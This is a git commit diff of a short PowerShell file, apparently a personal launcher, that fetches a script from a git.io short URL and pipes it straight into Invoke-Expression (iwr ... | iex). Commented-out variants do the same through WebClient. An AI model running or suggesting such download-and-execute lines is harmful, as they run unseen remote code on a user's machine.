02de9b99c6cc1f6f3d422e36282e975dc7f0cd66
93andresen@gmail.com <93andresen@gmail.com>
2022-02-18 01:21:10 +0100

    --- Auto-Git Commit ---

--- command_to_run_short_url_script.ps1
+++ command_to_run_short_url_script.ps1
@@ -1,5 +1,13 @@
 
-iwr git.io/J13Mt -UseBasicParsing|iex
+
+
+
+
+
+iwr https://git.io/J13Mt -UseBasicParsing|iex
+
+
+
 #iwr https://git.io/J13Mt|iex
 #iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/J13Mt'))
 
